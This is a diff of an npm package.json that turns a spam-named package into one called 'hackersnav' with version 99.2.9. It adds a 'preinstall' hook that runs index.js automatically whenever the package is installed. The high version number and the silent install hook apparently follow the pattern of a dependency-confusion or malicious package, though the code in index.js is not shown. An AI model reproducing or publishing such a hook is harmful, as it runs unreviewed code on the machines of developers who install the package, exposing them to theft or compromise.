@@ -1,14 +1,12 @@
 {
-  "name": "arqueologia_mexicana_cocina_prehispanica_recetario_pdf_wr59",
-  "version": "1.0.0",
-  "description": "arqueologia mexicana cocina prehispanica recetario pdf",
-  "main": "",
+  "name": "hackersnav",
+  "version": "99.2.9",
+  "description": "",
+  "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "test": "echo \"Error: no test specified\" && exit 1",
+     "preinstall": "node index.js"
   },
-  "keywords": [
-    "arqueologia mexicana cocina prehispanica recetario pdf"
-  ],
-  "author": "",
+  "author": "any",
   "license": "ISC"
 }
